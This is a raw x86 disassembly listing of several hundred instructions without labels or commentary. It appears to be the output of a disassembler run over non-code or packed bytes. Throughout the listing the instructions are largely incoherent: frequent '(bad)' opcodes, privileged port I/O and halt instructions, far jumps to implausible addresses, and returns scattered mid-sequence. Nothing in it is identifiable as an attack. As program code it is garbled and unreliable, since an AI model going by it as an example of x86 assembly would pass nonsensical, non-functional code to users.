  432dd5:	mov    eax,esi
  432dd7:	call   0x520481aa
  432ddc:	dec    ebp
  432ddd:	add    eax,0xf8728b
  432de2:	adc    eax,0xce0ccac9
  432de7:	push   ebp
  432de8:	ret    0xc6ec
  432deb:	in     al,dx
  432dec:	call   0x33437af5
  432df1:	push   edi
  432df2:	add    edi,eax
  432df4:	xor    eax,eax
  432df6:	jmp    0x432e3d
  432df8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432dfe:	add    eax,edi
  432e00:	shr    eax,cl
  432e02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432e08:	mov    esi,DWORD PTR [esp+ebp*8]
  432e0b:	pushf  
  432e0c:	ret    0x84c7
  432e0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432e15:	inc    ebp
  432e16:	in     al,dx
  432e17:	xor    eax,0xc78b9c45
  432e1c:	cld    
  432e1d:	fmul   st(2),st
  432e1f:	sbb    dl,al
  432e21:	jmp    0x9c3b:0x364d45c1
  432e28:	jbe    0x432df1
  432e2a:	mov    esp,eax
  432e2c:	clc    
  432e2d:	add    BYTE PTR [ebp+0x0],cl
  432e30:	mov    ecx,ecx
  432e32:	lea    eax,[ebp-0x5]
  432e35:	mov    edi,edi
  432e37:	call   0x51ce8181
  432e3c:	hlt    
  432e3d:	xor    eax,edx
  432e3f:	mov    esi,0x9a7284
  432e44:	xor    cl,dl
  432e46:	mov    esi,eax
  432e48:	hlt    
  432e49:	into   
  432e4a:	inc    ebp
  432e4b:	scas   eax,DWORD PTR es:[edi]
  432e4c:	mov    ebp,ecx
  432e4e:	cld    
  432e4f:	add    dl,cl
  432e51:	add    dl,al
  432e53:	inc    ebp
  432e54:	shr    DWORD PTR [ebx],0x4d
  432e57:	xor    edi,DWORD PTR [ebx]
  432e59:	mov    DWORD PTR [edi],ecx
  432e5b:	clc    
  432e5c:	dec    esi
  432e5d:	inc    ebp
  432e5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432e64:	ret    0xc6ca
  432e67:	mov    BYTE PTR [ebp-0x32],0x53
  432e6b:	scas   eax,DWORD PTR es:[edi]
  432e6c:	inc    ebp
  432e6d:	jmp    0x432ea5
  432e6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432e76:	pop    ebx
  432e77:	xor    ecx,DWORD PTR [ebp+0x3]
  432e7a:	mov    eax,DWORD PTR [ebx]
  432e7c:	clc    
  432e7d:	test   edx,ecx
  432e7f:	mov    ecx,esi
  432e81:	cld    
  432e82:	call   0x8ab773cc
  432e87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432e8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432e93:	fdiv   QWORD PTR [ebx]
  432e95:	retf   0xce89
  432e98:	in     al,0xc1
  432e9a:	inc    ebp
  432e9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432ea1:	into   
  432ea2:	mov    dh,0xc1
  432ea5:	call   0x8c17742e
  432eaa:	(bad)  
  432eab:	cld    
  432eac:	mov    ecx,DWORD PTR [ebp-0x14]
  432eaf:	xor    eax,ecx
  432eb1:	lea    eax,[ebp+0x8]
  432eb4:	mov    esi,DWORD PTR [edx-0x4]
  432eb7:	add    dl,al
  432eb9:	inc    ebp
  432eba:	mov    esp,0x32d89a8b
  432ebf:	dec    ebp
  432ec0:	mov    esi,DWORD PTR [ebx]
  432ec2:	cld    
  432ec3:	xor    eax,edx
  432ec5:	sub    esp,DWORD PTR [esi-0x75]
  432ec8:	int    0xec
  432eca:	sub    ecx,eax
  432ecc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432ed2:	mov    esi,esp
  432ed4:	call   0x34177c5d
  432ed9:	inc    DWORD PTR [ebx]
  432edb:	mov    edi,DWORD PTR [ebx]
  432edd:	cld    
  432ede:	jne    0x432f2d
  432ee0:	mov    esi,DWORD PTR [ebx]
  432ee2:	aam    0x8d
  432ee4:	dec    ebp
  432ee5:	or     BYTE PTR [ebx],dh
  432ee7:	jb     0x432eec
  432ee9:	add    BYTE PTR [edi+0x45],bl
  432eec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ef3:	xor    ebp,esp
  432ef5:	xor    eax,edi
  432ef7:	sub    edi,esp
  432ef9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432eff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432f06:	inc    ebp
  432f07:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432f0d:	clc    
  432f0e:	mov    eax,edi
  432f10:	nop
  432f11:	fadd   QWORD PTR [eax]
  432f13:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432f19:	jmp    0x432ea4
  432f1b:	mov    eax,DWORD PTR [ecx]
  432f1d:	fadd   DWORD PTR [eax]
  432f1f:	inc    ebp
  432f20:	or     DWORD PTR [ebx],esi
  432f22:	dec    eax
  432f23:	add    edx,DWORD PTR [ebx-0x2d]
  432f26:	dec    ebp
  432f27:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432f2d:	inc    ebp
  432f2e:	push   ebx
  432f2f:	mov    dl,BYTE PTR [ecx-0xd]
  432f32:	xor    ecx,DWORD PTR [ebp-0x45]
  432f35:	(bad)  
  432f37:	rol    BYTE PTR [eax],0xc1
  432f3a:	ret    
  432f3b:	inc    ebp
  432f3c:	inc    ebp
  432f3d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432f43:	xor    eax,ebx
  432f45:	add    eax,DWORD PTR [ebp+0x23]
  432f48:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  432f4e:	cmp    edi,0xc
  432f51:	dec    ebp
  432f52:	inc    ebp
  432f53:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  432f59:	inc    ebp
  432f5a:	mov    esi,DWORD PTR [ebx]
  432f5c:	clc    
  432f5d:	lea    eax,[ebp+0x45725407]
  432f63:	add    BYTE PTR [ebp+eax*2-0x75],dh
  432f67:	xor    edi,DWORD PTR [eax]
  432f69:	mov    ecx,0xff8b8d4d
  432f6e:	push   esp
  432f6f:	enter  0x4df7,0x23
  432f73:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  432f79:	mov    eax,DWORD PTR [ebx]
  432f7b:	loopne 0x432f68
  432f7d:	ret    0xc68b
  432f80:	push   esp
  432f81:	enter  0x9745,0x8b
  432f85:	inc    ebp
  432f86:	cld    
  432f87:	mov    eax,edi
  432f89:	clc    
  432f8a:	ret    
  432f8b:	ret    0xc645
  432f8e:	mov    esi,DWORD PTR [ebx]
  432f90:	cld    
  432f91:	pop    esi
  432f92:	mov    ebx,0x83458bc3
  432f98:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  432f9c:	dec    ebp
  432f9d:	xor    eax,0xba039c33
  432fa2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  432fa8:	inc    ebp
  432fa9:	mov    edi,DWORD PTR [ebx]
  432fab:	adc    al,0x9c
  432fad:	inc    ebp
  432fae:	(bad)  
  432faf:	mov    ebx,eax
  432fb1:	adc    al,0x85
  432fb3:	cmp    al,0x1
  432fb6:	inc    ebp
  432fb7:	add    BYTE PTR [ecx],bh
  432fb9:	dec    ebp
  432fba:	pushf  
  432fbb:	mov    ebp,ecx
  432fbd:	mov    eax,DWORD PTR [ebx]
  432fbf:	nop
  432fc0:	add    BYTE PTR [eax],al
  432fc2:	inc    ebp
  432fc3:	mov    esi,DWORD PTR [ebx]
  432fc5:	add    eax,DWORD PTR [ebx]
  432fc7:	cmp    al,0x89
  432fc9:	mov    esp,esi
  432fcb:	clc    
  432fcc:	inc    ebp
  432fcd:	inc    ebp
  432fce:	add    edx,DWORD PTR [esi+0xc]
  432fd1:	mov    edi,0x7ff0845
  432fd6:	in     al,dx
  432fd7:	(bad)  
  432fd8:	jne    0x432f74
  432fda:	mov    esi,DWORD PTR [edx]
  432fdc:	clc    
  432fdd:	add    ebp,DWORD PTR [esi]
  432fdf:	mov    edi,edi
  432fe1:	in     al,dx
  432fe2:	mov    DWORD PTR [ebp-0x10],eax
  432fe5:	xor    eax,DWORD PTR [ebp+0x3]
  432fe8:	cmp    eax,0x8bf49c89
  432fed:	inc    ebp
  432fee:	fmul   DWORD PTR [ebx-0x173caf39]
  432ff4:	lea    ecx,[ecx+0x45e8d4bc]
  432ffa:	clc    
  432ffb:	mov    edi,edi
  432ffd:	cmp    BYTE PTR [ebp+0x4d],al
  433000:	test   DWORD PTR [eax+0x74],ecx
  433003:	inc    ecx
  433004:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43300a:	ret    
  43300b:	inc    eax
  43300c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433012:	push   eax
  433013:	dec    eax
  433014:	test   al,0xd0
  433016:	dec    eax
  433018:	mov    eax,DWORD PTR [ebp-0x14]
  43301b:	mov    eax,DWORD PTR [ebp+0x38]
  43301e:	mov    eax,ecx
  433020:	fadd   DWORD PTR [ebx]
  433022:	dec    ebp
  433023:	inc    eax
  433024:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43302a:	inc    ebp
  43302b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433031:	fadd   QWORD PTR [ebx]
  433033:	inc    ebp
  433034:	or     al,0x33
  433036:	dec    ebp
  433037:	add    edi,DWORD PTR [ebx]
  433039:	mov    DWORD PTR [edx-0x28],esi
  43303c:	mov    eax,DWORD PTR [ebp-0x10]
  43303f:	mov    eax,DWORD PTR [eax+0x10]
  433042:	mov    eax,edi
  433044:	lock ret 
  433046:	inc    ecx
  433047:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43304d:	fsubr  st,st(5)
  43304f:	test   DWORD PTR [eax],eax
  433051:	clc    
  433052:	push   0x45
  433054:	(bad)  
  433055:	cmp    ch,ah
  433057:	pushf  
  433058:	inc    ebp
  433059:	(bad)  
  43305a:	push   eax
  43305b:	fsub   DWORD PTR [eax-0x7b]
  43305e:	(bad)  
  43305f:	clc    
  433060:	mov    eax,0xf8008584
  433065:	mov    eax,DWORD PTR [ebp-0x4]
  433068:	mov    edi,0x4585c3cc
  43306e:	clc    
  43306f:	mov    eax,DWORD PTR [ebp+0x14]
  433072:	cmp    eax,DWORD PTR [ebp-0x64]
  433075:	mov    edi,eax
  433077:	in     al,dx
  433078:	les    esi,FWORD PTR [ebp-0x7b]
  43307b:	mov    edi,eax
  43307d:	or     al,0x4d
  43307f:	dec    ebp
  433080:	mov    eax,ebp
  433082:	in     al,0xf2
  433084:	dec    ebp
  433085:	dec    DWORD PTR [ecx+0x4dc7e045]
  43308b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433091:	inc    ebp
  433092:	mov    DWORD PTR [ebx],esi
  433094:	fadd   QWORD PTR [ebx]
  433096:	dec    ebp
  433097:	push   eax
  433098:	xor    eax,DWORD PTR [ebp+0x3]
  43309b:	push   eax
  43309c:	mov    DWORD PTR [eax+ebx*8],ebx
  43309f:	push   esi
  4330a1:	mov    eax,DWORD PTR [eax]
  4330a3:	lock cmp eax,0xf84e85c0
  4330a9:	inc    ebp
  4330aa:	test   BYTE PTR [ebx],dh
  4330ac:	add    DWORD PTR [ebx],eax
  4330ae:	add    BYTE PTR [eax+0x4d],dl
  4330b1:	jne    0x4330e6
  4330b3:	lea    ecx,[ebx-0x7617fc44]
  4330b9:	div    ah
  4330bb:	inc    DWORD PTR [ebp+0x45]
  4330be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4330c4:	jb     0x433051
  4330c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4330cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4330d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4330d3:	mov    edi,DWORD PTR [ebx]
  4330d5:	adc    BYTE PTR [ebp+0x41],dh
  4330d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4330de:	ret    
  4330df:	push   ss
  4330e0:	push   0x45
  4330e2:	lea    ecx,[ebx+0x4de80cb0]
  4330e8:	sti    
  4330e9:	add    edi,edi
  4330eb:	or     BYTE PTR [ebp+0x4d],al
  4330ee:	mov    ebp,DWORD PTR [ebx]
  4330f0:	xor    ebp,ecx
  4330f2:	mov    al,BYTE PTR [edx]
  4330f4:	add    eax,0xc7200
  4330f9:	jne    0x433148
  4330fb:	lea    esi,[ebx]
  4330fd:	mov    al,0xf
  4330ff:	call   0xf27c4
  433104:	shl    DWORD PTR ds:0x89019c84,0x0
  43310b:	rol    BYTE PTR [ebp+0x45],1
  43310e:	mov    esi,DWORD PTR [ebx+esi*1]
  433111:	pushf  
  433112:	mov    al,bh
  433114:	add    eax,0x8572c8
  433119:	clc    
  43311a:	dec    ebp
  43311b:	inc    ebp
  43311c:	xor    edi,DWORD PTR [edx]
  43311e:	setl   al
  433121:	(bad)  
  433122:	retf   
  433123:	rol    cl,1
  433125:	dec    ebp
  433126:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43312c:	inc    ebp
  43312d:	lea    ecx,[ebx-0x75b2cc38]
  433133:	lea    eax,ds:0x4d72c4
  433139:	mov    ecx,DWORD PTR [ebp-0x4]
  43313c:	xor    ecx,edi
  43313e:	bswap  ebx
  433140:	ror    BYTE PTR [ebp-0x35],0xe9
  433144:	rol    DWORD PTR [ecx],0x84
  433147:	add    BYTE PTR [ecx],al
  433149:	cmp    eax,DWORD PTR [eax]
  43314b:	pushf  
  43314c:	inc    ebp
  43314d:	jnp    0x8a436550
  433153:	mov    eax,DWORD PTR ds:0xcf72e8
  433159:	lock dec ebp
  43315b:	retf   
  43315c:	xor    ecx,DWORD PTR [ebp+0xf]
  43315f:	mov    eax,eax
  433161:	fmul   st,st(3)
  433163:	test   ecx,0x19a8484
  433169:	xor    al,BYTE PTR [eax]
  43316b:	mov    DWORD PTR [ebp-0x28],eax
  43316e:	mov    eax,DWORD PTR [ebp+0x33]
  433171:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433177:	ret    
  433178:	add    al,cl
  43317a:	dec    ebp
  43317b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433181:	add    ecx,DWORD PTR ds:0xc7250
  433187:	inc    ebp
  433188:	rcl    DWORD PTR [eax+0x4d],0x2b
  43318c:	mov    edi,edi
  43318e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433194:	jb     0x43315d
  433196:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43319d:	mov    esi,DWORD PTR [ebx]
  43319f:	cld    
  4331a0:	mov    cl,bh
  4331a2:	or     eax,0x372b6
  4331a7:	cmp    ecx,eax
  4331a9:	jne    0x433226
  4331af:	mov    eax,DWORD PTR [ebp-0x20]
  4331b2:	mov    eax,DWORD PTR [eax]
  4331b4:	xor    eax,edi
  4331b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4331bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331c0:	mov    ecx,edi
  4331c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331c8:	jb     0x4331d9
  4331ca:	add    BYTE PTR [edi-0x3f],dl
  4331cd:	add    BYTE PTR [ebp-0x75],cl
  4331d0:	mov    esi,eax
  4331d2:	xor    eax,DWORD PTR [eax]
  4331d4:	mov    al,bh
  4331d6:	or     eax,0x4a7284
  4331db:	xor    al,cl
  4331dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331e0:	mov    ecx,edi
  4331e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331e8:	jb     0x4331f9
  4331ea:	add    BYTE PTR [edi],dh
  4331ec:	enter  0x8500,0x8b
  4331f0:	add    ah,bl
  4331f2:	add    BYTE PTR [eax],al
  4331f4:	inc    ebp
  4331f5:	(bad)  
  4331f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4331fd:	mov    esi,DWORD PTR [edx-0x4]
  433200:	add    bh,cl
  433202:	dec    ebp
  433203:	mov    dh,0x8b
  433205:	add    esi,DWORD PTR [ebx]
  433207:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43320d:	add    BYTE PTR [eax],al
  43320f:	mov    eax,ecx
  433211:	loopne 0x433260
  433213:	add    BYTE PTR [ebx-0x757bcc39],cl
  433219:	dec    edx
  43321a:	or     eax,0x8b7232
  43321f:	in     al,0xc1
  433221:	or     DWORD PTR [ebp-0x31],ecx
  433224:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43322b:	xor    dh,BYTE PTR [edx-0x75]
  43322e:	add    al,dh
  433230:	enter  0x4f09,0xcf
  433234:	inc    ebp
  433235:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43323b:	or     al,BYTE PTR ds:0xe4728b
  433241:	or     DWORD PTR [ebp-0x31],ecx
  433244:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43324b:	cmp    dh,BYTE PTR [edx+0xf]
  43324e:	add    bl,dl
  433250:	rol    DWORD PTR [eax],0x4d
  433253:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433259:	(bad)  
  43325a:	or     eax,0x4a7284
  43325f:	xor    al,cl
  433261:	mov    ecx,DWORD PTR [ebp-0x20]
  433264:	mov    ecx,DWORD PTR [ecx]
  433266:	xor    ecx,edi
  433268:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43326f:	xor    cl,al
  433271:	mov    ecx,DWORD PTR [edi]
  433273:	fadd   QWORD PTR [ebp+0x9]
  433276:	call   0xffd02d4a
  43327b:	dec    edx
  43327c:	dec    ebp
  43327d:	xor    bh,BYTE PTR [ebx]
  43327f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433283:	loopne 0x433281
  433285:	or     edi,eax
  433287:	iret   
  433288:	ret    
  433289:	mov    WORD PTR [ebp+0x4e],es
  43328c:	mov    esi,DWORD PTR [edx]
  43328e:	call   0x8452f9cd
  433293:	(bad)  
  433294:	call   0x8bdc:0x338b3200
  43329b:	add    ah,bh
  43329d:	(bad)  
  43329e:	push   ebp
  43329f:	test   BYTE PTR [ebx],dh
  4332a1:	dec    edx
  4332a2:	add    esi,DWORD PTR [edx]
  4332a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4332aa:	dec    edi
  4332ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4332b3:	xor    al,BYTE PTR [ebx]
  4332b5:	mov    edi,DWORD PTR [ebx]
  4332b7:	in     al,0x75
  4332b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4332bf:	dec    edx
  4332c0:	xor    esi,DWORD PTR [edx]
  4332c2:	lea    ecx,[edx]
  4332c4:	or     BYTE PTR [ebx+0x900f072],cl
  4332ca:	ja     0x43329b
  4332cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4332d3:	cmp    ch,al
  4332d5:	jne    0x4332ca
  4332d7:	mov    edi,edi
  4332d9:	fadd   QWORD PTR [ebp+0x0]
  4332dc:	mov    eax,edi
  4332de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4332e5:	mov    edx,DWORD PTR [ebx]
  4332e7:	in     al,0x45
  4332e9:	or     DWORD PTR [ebx],esi
  4332eb:	iret   
  4332ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4332f3:	xor    dl,BYTE PTR [eax-0x75]
  4332f6:	sbb    al,0xe0
  4332f8:	dec    DWORD PTR [ecx]
  4332fa:	mov    ecx,edi
  4332fc:	in     al,dx
  4332fd:	mov    eax,es
  4332ff:	dec    edx
  433300:	mov    DWORD PTR [edx],esi
  433302:	fmul   QWORD PTR [edx]
  433304:	jne    0x433291
  433306:	(bad)  
  433307:	(bad)  
  433309:	or     DWORD PTR [ebp-0x31],eax
  43330c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433313:	cmp    bh,bh
  433315:	jne    0x43335c
  433317:	lea    ecx,[ebx-0x38372750]
  43331d:	inc    ebx
  43331f:	mov    eax,ecx
  433321:	mov    eax,0xa00c111
  433326:	jne    0x43336d
  433328:	mov    esi,DWORD PTR [ebx]
  43332a:	test   al,0x3
  43332c:	inc    ebp
  43332d:	mov    DWORD PTR [eax-0xc],edx
  433330:	loop   0x433377
  433332:	push   DWORD PTR [ebx]
  433334:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43333a:	add    DWORD PTR [eax],eax
  43333c:	mov    eax,edi
  43333e:	lods   al,BYTE PTR ds:[esi]
  43333f:	dec    ebp
  433340:	inc    ebp
  433341:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433347:	retf   
  433348:	mov    edx,ecx
  43334a:	adc    al,0x84
  43334c:	(bad)  
  43334d:	std    
  43334e:	ret    
  43334f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433355:	hlt    
  433356:	rol    edi,0x82
  433359:	ret    
  43335a:	cld    
  43335b:	enter  0x11ff,0x45
  43335f:	inc    ebp
  433360:	pop    edi
  433361:	mov    ebx,DWORD PTR [ebx+0x14]
  433364:	ret    0xc7
  433367:	test   BYTE PTR [ebx+0x4532519a],cl
  43336d:	jmp    0x4332fa
  43336f:	push   0x8
  433371:	call   DWORD PTR [esi]
  433373:	in     al,dx
  433374:	add    BYTE PTR [ebp+0x1],0x50
  433378:	add    bh,ah
  43337a:	add    bh,bh
  43337c:	icebp  
  43337d:	mov    ecx,DWORD PTR [eax]
  43337f:	cld    
  433380:	pop    es
  433381:	dec    ebp
  433382:	shl    DWORD PTR [ebx],0x72
  433385:	add    eax,DWORD PTR [eax]
  433387:	cmp    edx,ecx
  433389:	je     0x43339b
  43338b:	mov    esi,DWORD PTR [ebp-0x4]
  43338e:	inc    edi
  433390:	or     al,0xc3
  433392:	jmp    FWORD PTR [edx-0x18]
  433395:	(bad)  
  433396:	sti    
  433397:	cwde   
  433398:	(bad)  
  433399:	call   0xffa12ca4
  43339e:	or     al,0x45
  4333a0:	push   ebp
  4333a1:	sub    esp,0x18
  4333a4:	push   ebx
  4333a5:	inc    ebp
  4333a6:	mov    edi,edi
  4333a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4333af:	test   al,0x53
  4333b1:	inc    ebp
  4333b2:	push   ecx
  4333b3:	push   eax
  4333b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4333ba:	add    ah,bh
  4333bc:	(bad)  
  4333bd:	dec    ebp
  4333be:	add    DWORD PTR [ebx],esi
  4333c0:	inc    ebp
  4333c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4333c7:	push   0xffffff8b
  4333c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4333cf:	add    eax,DWORD PTR [ecx]
  4333d1:	or     BYTE PTR [eax],al
  4333d3:	call   0xff852bd8
  4333d8:	mov    eax,DWORD PTR [ebp+0x14]
  4333db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4333e1:	inc    ebp
  4333e2:	dec    ecx
  4333e3:	add    ebp,DWORD PTR [edx+0x14]
  4333e6:	push   0x8b3045
  4333eb:	call   0x33ad8160
  4333f0:	inc    DWORD PTR [ebx]
  4333f2:	mov    DWORD PTR [edi],ecx
  4333f4:	mov    eax,ecx
  4333f6:	or     BYTE PTR [ebp-0x3d],cl
  4333f9:	cmp    eax,edi
  4333fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433400:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433406:	adc    al,0xc9
  433408:	inc    ebp
  433409:	adc    BYTE PTR [eax+0x55],dl
  43340c:	jne    0x4333fa
  43340e:	call   0xff54339e
  433413:	dec    ebp
  433414:	inc    ebp
  433415:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43341b:	add    BYTE PTR [ebx],bh
  43341d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433421:	push   ebx
  433422:	or     al,0x51
  433424:	dec    ebp
  433425:	xor    DWORD PTR [ebx],0xf32039a
  43342b:	cmp    eax,DWORD PTR [ebp+0x74]
  43342e:	mov    edi,edi
  433430:	pop    edi
  433431:	adc    BYTE PTR [ebx+0x75],bl
  433434:	ret    0x50
  433437:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43343b:	(bad)  
  43343c:	clc    
  43343d:	mov    esp,ebp
  43343f:	pop    ecx
  433440:	mov    ecx,0xf80085c2
  433445:	mov    ecx,DWORD PTR [ecx+edx*2]
  433448:	push   esi
  433449:	push   esi
  43344a:	(bad)  
  43344b:	lock inc DWORD PTR [ebp+0x44]
  43344f:	mov    edx,DWORD PTR [eax]
  433451:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433455:	or     BYTE PTR [ebx+0x7],dl
  433458:	push   ecx
  433459:	ret    
  43345a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433460:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433466:	or     al,0x80
  433468:	jge    0x43346b
  43346a:	mov    DWORD PTR [eax],eax
  43346c:	and    al,0x8
  43346e:	cmp    DWORD PTR [ebp+0x10],eax
  433471:	mov    edx,DWORD PTR [esi]
  433473:	xchg   esp,eax
  433474:	dec    esp
  433475:	add    BYTE PTR [eax],dl
  433477:	mov    ecx,edx
  433479:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43347d:	dec    ebp
  43347e:	into   
  43347f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433485:	mov    edx,DWORD PTR [eax+0x14]
  433488:	das    
  433489:	add    al,0x45
  43348b:	add    BYTE PTR [ebp+0x0],dh
  43348e:	mov    edi,edi
  433490:	and    al,0x50
  433492:	mov    eax,DWORD PTR [eax]
  433494:	and    al,0xd1
  433496:	xor    eax,DWORD PTR [esi]
  433498:	lea    eax,[ebp+0x8]
  43349b:	xor    esi,DWORD PTR [edx+0x3]
  43349e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4334a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4334aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4334b4:	cmp    bh,bh
  4334b6:	pushf  
  4334b7:	mov    edi,edi
  4334b9:	or     BYTE PTR [esi+ecx*1],cl
  4334bc:	jne    0x433481
  4334be:	call   0xc348a
  4334c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4334c7:	mov    ebx,DWORD PTR [eax]
  4334c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4334cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4334d5:	pop    esi
  4334d6:	jmp    0x4334a1
  4334d8:	and    al,0x10
  4334da:	and    al,0x55
  4334dc:	or     ah,ch
  4334de:	and    al,0xe4
  4334e0:	inc    DWORD PTR [ebx+0x35e81024]
  4334e6:	(bad)  
  4334e7:	pushf  
  4334e8:	dec    DWORD PTR [ecx+0x570c2444]
  4334ee:	pop    esi
  4334ef:	inc    ecx
  4334f0:	in     eax,0x89
  4334f2:	ret    0x24
  4334f5:	mov    edi,eax
  4334f7:	and    al,0x7d
  4334f9:	mov    edx,0x768089c
  4334fe:	clc    
  4334ff:	cli    
  433500:	call   FWORD PTR [edx+0x3893274]
  433506:	dec    DWORD PTR [ecx-0x74e7db01]
  43350c:	adc    al,0xc
  43350e:	(bad)  
  43350f:	jl     0x433535
  433511:	adc    al,0x8b
  433513:	dec    ebp
  433514:	or     al,0x75
  433516:	jmp    0x4334a3
  433518:	adc    BYTE PTR [esp+eax*2],ah
  43351b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43351f:	and    al,0x9a
  433521:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433527:	dec    esp
  433528:	jne    0x433532
  43352a:	jne    0x433565
  43352c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433533:	test   BYTE PTR [ebp+0x32],bl
  433536:	and    al,0x85
  433538:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43353e:	pop    edi
  43353f:	(bad)  
  433540:	sbb    edx,DWORD PTR [eax]
  433542:	add    dl,dl
  433544:	cmp    edx,DWORD PTR [eax]
  433546:	add    BYTE PTR [esi+0x7e],al
  433549:	adc    BYTE PTR [eax],al
  43354b:	mov    eax,ds:0x1c00107e
  433550:	push   edx
  433551:	adc    BYTE PTR [eax],al
  433553:	cli    
  433554:	push   ss
  433555:	adc    BYTE PTR [eax],al
  433557:	lahf   
  433558:	adc    edx,DWORD PTR [eax]
  43355a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43355e:	add    BYTE PTR [edi+0x19001004],ah
  433564:	inc    eax
  433565:	adc    BYTE PTR [eax],al
  433567:	ds jge 0x43357a
  43356a:	add    BYTE PTR [edi],bh
  43356c:	xor    eax,0x35430043
  433571:	inc    ebx
  433572:	add    BYTE PTR [edi+0x35],al
  433575:	inc    ebx
  433576:	add    BYTE PTR [ebx+0x35],cl
  433579:	inc    ebx
  43357a:	add    BYTE PTR [edi+0x35],cl
  43357d:	inc    ebx
  43357e:	add    BYTE PTR [ebx+0x35],dl
  433581:	inc    ebx
  433582:	add    BYTE PTR [edi+0x35],dl
  433585:	inc    ebx
  433586:	add    BYTE PTR [ebx+0x35],bl
  433589:	inc    ebx
  43358a:	add    BYTE PTR [edi+0x35],bl
  43358d:	inc    ebx
  43358e:	add    BYTE PTR [ebx+0x35],ah
  433591:	inc    ebx
  433592:	add    BYTE PTR [edi+0x35],ah
  433595:	inc    ebx
  433596:	add    BYTE PTR [ecx],ah
  433598:	jno    0x4335aa
  43359a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4335a1:	adc    BYTE PTR [eax],al
  4335a3:	ja     0x433615
  4335a5:	adc    BYTE PTR [eax],al
  4335a7:	xor    BYTE PTR [edx+0x10],0x0
  4335ab:	loopne 0x43361b
  4335ad:	adc    BYTE PTR [eax],al
  4335af:	cmp    BYTE PTR [eax+0x10],dl
